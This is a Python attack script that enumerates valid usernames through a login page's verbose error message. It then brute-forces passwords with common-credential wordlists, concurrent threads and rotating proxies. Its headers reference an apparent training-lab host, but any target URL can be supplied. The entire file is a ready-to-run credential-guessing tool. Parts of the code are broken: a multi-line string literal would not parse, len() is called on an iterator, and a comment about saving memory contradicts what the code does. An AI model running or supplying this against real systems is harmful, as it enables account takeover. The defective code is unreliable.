#!/usr/bin/env python3
# This script was partially generated with the assistance of OpenAI's ChatGPT.


import requests
import time
import random
import argparse
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import product

# ==========================
# Default Configuration
# ==========================
DEFAULT_USERNAME_FILE = "/usr/share/seclists/Usernames/Names/names.txt"
DEFAULT_PASSWORD_FILE = "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
DEFAULT_OUTPUT_FILE = "valid_usernames.txt"
DEFAULT_THREADS = 20
DEFAULT_DELAY = 0.0
DEFAULT_SUCCESS_WORDS = "welcome,dashboard,logout,my account,you are logged in"

# ==========================
# Utility Functions
# ==========================

def load_lines(filepath: str) -> list:
    try:
        with open(filepath, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Error reading file '{filepath}': {e}")
        exit()

def write_scan_header(output_path: str, timestamp: str) -> None:
    with open(output_path, "a") as f:
        f.write(f"\n===== Scan started at {timestamp} =====\n")

def append_username(output_path: str, username: str) -> None:
    with open(output_path, "a") as f:
        f.write(username + "\n")

def print_eta(start_time: float, current_index: int, total: int) -> None:
    elapsed = time.time() - start_time
    avg = elapsed / current_index
    remaining = total - current_index
    eta = timedelta(seconds=int(avg * remaining))
    print(f"[\u23f1\ufe0f] Elapsed: {timedelta(seconds=int(elapsed))} | Remaining: ~{eta}")

def check_username(username: str, url: str, headers: dict, proxies: list, delay: float) -> str | None:
    data = {"username": username, "password": "password"}
    proxy = random.choice(proxies) if proxies else None
    proxy_dict = {"http": proxy, "https": proxy} if proxy else None
    try:
        response = requests.post(url, data=data, headers=headers, timeout=5, proxies=proxy_dict)
        if "Wrong password" in response.text:
            return username
    except requests.RequestException:
        pass
    if delay:
        time.sleep(delay)
    return None

def check_password_combo(username: str, password: str, url: str, headers: dict, proxies: list, delay: float, success_keywords: list[str]) -> tuple[str, str] | None:
    data = {"username": username, "password": password}
    proxy = random.choice(proxies) if proxies else None
    proxy_dict = {"http": proxy, "https": proxy} if proxy else None
    try:
        response = requests.post(url, data=data, headers=headers, timeout=5, proxies=proxy_dict, allow_redirects=True)
        lower = response.text.lower()
        if any(keyword in lower for keyword in success_keywords):
            return (username, password)
    except requests.RequestException:
        pass
    if delay:
        time.sleep(delay)
    return None

# ==========================
# Main logic
# ==========================

def main():
    parser = argparse.ArgumentParser(description="Username checker with optional password testing.")
    parser.add_argument("-u", "--url", type=str, required=True, help="Target login URL")
    parser.add_argument("-w", "--usernames", type=str, default=DEFAULT_USERNAME_FILE, help="Usernames file path")
    parser.add_argument("-n", "--passwords", type=str, default=DEFAULT_PASSWORD_FILE, help="Passwords file path")
    parser.add_argument("--output", type=str, default=DEFAULT_OUTPUT_FILE, help="Output file for valid usernames")
    parser.add_argument("--check-passwords", action="store_true", help="Also test passwords")
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS, help="Number of concurrent threads")
    parser.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="Delay (in seconds) between requests")
    parser.add_argument("--proxies", type=str, help="Path to proxy list file")
    parser.add_argument("--success-words", type=str, default=DEFAULT_SUCCESS_WORDS, help="Comma-separated success keywords")
    args = parser.parse_args()

    if not args.url:
        parser.error("
[!] Missing required argument: --url.
Example: python script.py -u http://target/login.php")

    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }

    usernames = load_lines(args.usernames)
    proxies = load_lines(args.proxies) if args.proxies else []
    success_keywords = [kw.strip().lower() for kw in args.success_words.split(",")]

    total = len(usernames)
    print(f"\U0001f50d Loaded {total} usernames for checking.")

    found = []
    start_time = time.time()
    last_status_time = start_time
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    write_scan_header(args.output, timestamp)

    # Step 1: Username checking
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(check_username, user, args.url, headers, proxies, args.delay): user for user in usernames}

        for idx, future in enumerate(as_completed(futures), start=1):
            result = future.result()
            if result:
                print(f"[+] Valid username: {result}")
                found.append(result)
                append_username(args.output, result)

            now = time.time()
            if now - last_status_time >= 30:
                print_eta(start_time, idx, total)
                last_status_time = now

    print(f"\n✅ Username scan complete. Found {len(found)} valid usernames.")
    if found:
        print("\n\U0001f4cb Valid usernames:")
        for user in found:
            print(f" - {user}")
    else:
        print("No valid usernames found.")

    # Step 2: Optional password brute-force
    if args.check_passwords and found:
        print("\n\U0001f511 Starting password check...")
        passwords = load_lines(args.passwords)
        # Use generator instead of full list to save memory
        combos = product(found, passwords)
        total_combos = len(combos)
        print(f"\U0001f522 Total combinations to try: {total_combos}")

        start_pw_time = time.time()
        last_status_time = start_pw_time
        successful_logins = []

        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            # Submit tasks without storing all combinations in memory
            futures = [executor.submit(check_password_combo, u, p, args.url, headers, proxies, args.delay, success_keywords) for u, p in combos]

            for idx, future in enumerate(as_completed(futures), start=1):
                result = future.result()
                if result:
                    user, pwd = result
                    print(f"[✅] Login successful → {user}:{pwd}")
                    successful_logins.append(result)

                now = time.time()
                if now - last_status_time >= 30:
                    print_eta(start_pw_time, idx, total_combos)
                    last_status_time = now

        print(f"\n🔒 Password check complete. Found {len(successful_logins)} valid credentials.")
        if successful_logins:
            print("\n🗝️ Successful logins:")
            for user, pwd in successful_logins:
                print(f" - {user}:{pwd}")

# ==========================
# Entry Point
# ==========================

if __name__ == "__main__":
    main()
